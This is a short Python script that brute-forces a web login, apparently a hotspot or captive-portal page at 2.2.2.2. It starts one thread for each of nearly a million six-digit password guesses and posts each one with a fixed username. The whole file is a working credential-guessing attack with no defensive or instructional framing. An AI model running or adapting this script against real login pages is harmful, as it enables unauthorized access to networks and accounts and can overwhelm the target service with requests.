import  os,threading,asyncio,aiohttp                                                                 
                                                                                                     
                                                                                                     
async def main( payload :dict ):                                                                     
                                                                                                     
    async with aiohttp.ClientSession() as session:                                                   
        async with session.post('http://2.2.2.2/login', ssl=False,data=payload) as response:         
            print("Status:", response.status)                                                        
            print("Content-type:", response.headers['content-type'])                                 
            html = await response.text()                                                             
            print("Body:", html)                                                                     
def ttt(p :dict):                                                                                    
    print("X")                                                                                       
    try:                                                                                             
       asyncio.run(main(p))                                                                          
    except Exception as e:                                                                           
         print(e)                                                                                    
    print(p["password"])                                                                             
                                                                                                     
if __name__ == '__main__':                                                                           
    for i in range(999999):                                                                          
         p={"dst":	"","popup"	:"true","username"	:"48592","password"	:str(i).zfill(6)}            
                                                                                                     
         threading.Thread(target=ttt, args=(p,)).start()                                             
                                                                                                     
                                                                                                     
